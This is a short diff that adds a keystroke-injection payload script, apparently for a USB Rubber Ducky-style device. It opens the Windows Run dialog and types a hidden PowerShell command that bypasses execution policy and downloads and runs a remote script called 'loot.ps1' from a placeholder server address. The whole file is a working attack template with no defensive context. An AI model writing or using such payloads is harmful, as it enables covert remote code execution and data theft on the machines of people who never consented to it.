@@ -1,0 +1,5 @@
+DELAY 750
+GUI r
+DELAY 500
+STRING powershell -nop {{WIN_HIDDEN}} -ep bypass "IEX(irm http://{{SERVER_IP}}/loot.ps1)"
+ENTER
